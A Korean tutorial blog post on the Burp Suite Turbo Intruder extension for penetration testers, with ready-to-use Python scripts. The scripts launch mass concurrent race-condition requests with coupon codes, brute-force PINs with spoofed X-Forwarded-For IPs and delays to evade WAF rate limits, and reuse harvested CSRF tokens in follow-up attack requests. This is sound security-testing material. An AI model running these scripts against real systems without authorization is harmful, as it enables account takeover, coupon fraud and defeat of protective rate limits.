---
title: "Burp Suite 실무 활용: Turbo Intruder로 Race Condition과 Rate Limit 부수기"
excerpt: "단순한 Repeater 병렬 전송을 넘어, 파이썬 스크립트를 활용한 극강의 퍼징 및 상태 기반(Stateful) 공격 자동화 가이드"
categories: ['burpsuite']
typora-root-url: ../../
published: false
date: 2026-06-23
tags: [burpsuite, turbo-intruder, 모의해킹, 웹해킹, race-condition, 퍼징]
---

모의해킹 실무를 하다 보면, 단순히 파라미터 값만 바꿔서 수백 번 쏴보는 기본 `Intruder` 기능이나, 동시에 패킷을 날리는 `Repeater`의 병렬 전송(Send in parallel) 기능만으로는 부족한 순간이 온다.

- "단일 패킷이 아니라, 서로 다른 쿠폰 번호 1만 개를 동시에 레이스 컨디션으로 밀어 넣을 순 없을까?"
- "A 패킷을 보내고 받아온 응답(CSRF 토큰 등)을 파싱해서 0.01초 만에 B 패킷에 넣고 쏠 순 없을까?"
- "WAF가 너무 빡세서 초당 3개만 보내야 하는데, 이 정밀한 딜레이를 어떻게 조절하지?"

이 모든 갈증을 해결해 주는 것이 바로 **Turbo Intruder** 플러그인이다. 이번 글에서는 Turbo Intruder의 핵심 원리와, 실무에서 그대로 복붙해서 쓸 수 있는 파이썬(Python) 스크립트 작성법을 완벽하게 파헤쳐 본다.

## 1. Turbo Intruder의 핵심 원리와 차별점

Turbo Intruder는 Burp Suite의 기본 HTTP 스택을 아예 우회하여, 자바로 자체 구현된 커스텀 네트워킹 스택을 사용한다. 덕분에 엄청난 속도(수천~수만 건/초)를 내면서도 서버와 Burp가 뻗지 않도록 메모리를 최적화한다.

가장 큰 특징은 공격 로직을 **Python 스크립트**로 직접 짠다는 것이다. 화면 하단에 에디터가 있어서, 내 입맛에 맞게 HTTP 요청의 타이밍과 데이터를 자유자재로 요리할 수 있다.

### 💡 Repeater 병렬 전송(Single-packet attack)과는 무엇이 다를까?
최근 Burp 업데이트로 Repeater에서 탭들을 묶어서 쏘는 기능이 생겼다. 단순히 똑같은 패킷을 10번 날려서 "추천인 중복으로 올리기", "쿠폰 1개를 5번 쓰기" 같은 기본적인 레이스 컨디션은 이제 Repeater로도 충분하다.

하지만 Turbo Intruder는 **"대규모 데이터"**와 **"프로그래밍 로직"**이 들어가는 순간 빛을 발한다. 
Repeater 탭을 1만 개 만들 수는 없지 않은가? 수만 개의 딕셔너리 페이로드를 읽어와 각각 다른 값을 담아 동시에 발사하거나, 조건문(`if`)을 달아 응답값에 따라 공격 패킷을 다르게 조작하는 등(Stateful Attack) 고차원적인 해킹은 오직 Turbo Intruder만이 가능하다.

## 2. 설치 및 화면 구성
설치는 다른 확장 기능과 동일하게 `BApp Store`에서 **Turbo Intruder**를 찾아 Install을 누르면 끝이다. (별도의 Python/Jython 환경 세팅이 필요하지 않아 매우 깔끔하다.)

사용법도 간단하다. 타겟 패킷에서 우클릭 후 `Extensions > Turbo Intruder > Send to turbo intruder`를 누르면 전용 창이 열린다.

![image-20260623110350503](/images/2026-06-23-Burp_TurboIntruder/image-20260623110350503.png) *(이미지 첨부 예정)*

화면은 크게 3구역으로 나뉜다.
1. **위쪽**: 공격할 원본 패킷 (여기서 변조할 부분을 `%s`로 표시한다.)
2. **아래쪽**: 파이썬 스크립트 에디터
3. **결과 창**: 공격 버튼(`Attack`)을 누르면 나타나는 결과 테이블 (Logger++와 비슷하다.)

## 3. 실무 파이썬 스크립트 파헤치기
기본적으로 스크립트는 두 개의 함수로 이루어져 있다. 이 뼈대만 이해하면 모든 공격을 만들 수 있다.

- `queueRequests(target, wordlists)`: 어떤 패킷을 언제, 얼마나, 어떻게 큐(Queue)에 담을지 결정한다.
- `handleResponse(req, interesting)`: 서버로부터 돌아온 응답을 까보고, 결과 테이블에 표시할지 말지 필터링한다.

### 3.1. 가장 기본이 되는 Race Condition 스크립트
1만 개의 쿠폰 번호를 사전 파일에서 읽어와, **완벽하게 동시에(Concurrent)** 밀어 넣는 실무 스크립트다. 원본 패킷의 쿠폰 번호 자리를 `%s`로 바꿔준다. (`{"coupon_code": "%s"}`)

```python
def queueRequests(target, wordlists):
    # 1. 엔진 세팅 (동시 연결 수 설정)
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30, # 한 번에 유지할 연결 수
                           requestsPerConnection=100,
                           pipeline=False)

    # 2. 클립보드에 복사해둔 텍스트나 사전 파일을 wordlists 인자로 받아옴
    # 아래는 wordlists의 첫 번째 파일 라인을 순회하는 로직
    for word in open('/path/to/wordlist.txt'):
        # 3. 큐에 적재 (이때 gate 인자를 주면 패킷을 바로 보내지 않고 댐에 가둬둠)
        engine.queue(target.req, word.rstrip(), gate='race1')

    # 4. 큐에 쌓인 패킷들을 댐 수문을 열듯 동시에 발사!
    engine.openGate('race1')

def handleResponse(req, interesting):
    # 200 OK 응답이거나, 기존과 응답 크기가 다른 유의미한 결과만 테이블에 출력
    if req.status == 200 or interesting:
        table.add(req)
```
> **💡 핵심 요약**: `gate='race1'`으로 묶어둔 뒤 `openGate('race1')`을 호출하는 것이 레이스 컨디션의 핵심이다. 모든 소켓 연결을 열어두고 마지막 바이트(Last byte)만 남겨둔 채 대기하다가, 게이트가 열리면 마지막 바이트를 동시에 쏴서 서버의 타이밍을 완벽하게 맞춘다.

### 3.2. 악랄한 Rate Limit 우회 (WAF Bypass)
인증번호 입력이나 비밀번호 무차별 대입(Brute-force)을 할 때, 서버가 "초당 3회 이상 요청 시 IP 차단" 같은 빡센 룰을 걸어두는 경우가 많다. 이럴 땐 속도를 늦추고 헤더를 변조하는 지능적인 퍼징이 필요하다.

```python
import time

def queueRequests(target, wordlists):
    # WAF를 속이기 위해 연결을 최소화하고 파이프라인을 끈다.
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1, 
                           requestsPerConnection=1,
                           pipeline=False)

    for i in range(1000, 9999): # 1000~9999 핀번호 대입
        # 헤더 변조를 통한 IP 우회 기법 (X-Forwarded-For 등)
        # 패킷 내에 %s가 여러 개일 경우 리스트 형태로 값을 넘긴다.
        fake_ip = "192.168.0." + str(i % 254 + 1)
        
        # gate 없이 바로바로 쏜다.
        engine.queue(target.req, [fake_ip, str(i)])
        
        # 0.5초마다 한 번씩 쏘도록 정밀한 딜레이 추가 (WAF 우회)
        time.sleep(0.5)

def handleResponse(req, interesting):
    # "Invalid code" 같은 실패 메시지가 없는 응답만 화면에 출력 (빠른 식별)
    if "Invalid" not in req.response:
        table.add(req)
```

### 3.3. 이전 응답값을 다음 패킷에 넣기 (Stateful / 2-Step 공격)
Intruder로 불가능한 영역이다. A페이지에 요청을 보내 `CSRF_TOKEN`을 발급받은 뒤, 그 토큰을 조립해서 B페이지로 공격 패킷을 쏘는 로직이다. 이 경우 `handleResponse`에서 다음 공격을 트리거(`queue`)해야 한다.

```python
import re

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100)
                           
    # RequestEngine을 글로벌(전역)로 저장해 handleResponse에서 쓸 수 있게 함
    target.engine = engine
    
    # 1. 일단 토큰을 발급받는 GET 요청을 10번 던져본다.
    for i in range(10):
        engine.queue(target.req)

def handleResponse(req, interesting):
    # 2. 토큰 발급 응답에서 정규표현식으로 토큰값을 파싱한다.
    match = re.search(r'name="csrf_token" value="([a-zA-Z0-9]+)"', req.response)
    
    if match:
        token = match.group(1)
        # 3. 파싱한 토큰을 담아 진짜 공격 패킷(POST)을 조립해서 쏜다.
        # req.engine.queue() 를 이용해 실시간으로 큐에 추가
        attack_req = req.request.replace("CSRF_PLACEHOLDER", token)
        req.engine.queue(attack_req)
        
    table.add(req)
```

## 4. 실무 활용 꿀팁
Turbo Intruder 창 아래의 파이썬 에디터 영역을 보면 윗부분에 드롭다운 메뉴가 있다. 이 메뉴를 열어보면 `examples/` 폴더 하위에 **수십 개의 기본 스크립트 템플릿**이 들어있다. 

`multiple-parameters.py` (파라미터 여러 개 퍼징), `race-single-packet-attack.py` (가장 완벽한 레이스컨디션) 등 실무에서 겪을 만한 상황의 스크립트가 이미 다 짜여 있으니, 굳이 외울 필요 없이 꺼내서 상황에 맞게 조금씩 수정(`%s` 매핑 등)해서 쓰면 된다.

그리고 `handleResponse` 함수 안에서 `if req.status == 200:` 이나 `if "success" in req.response:` 처럼 내가 원하는 결과만 테이블에 뜨게끔 조건을 걸어두는 습관을 들이자. 수만 개의 쓰레기 응답 사이에서 취약점이 터진 단 한 줄의 로그를 찾느라 눈이 빠지는 일을 방지할 수 있다.
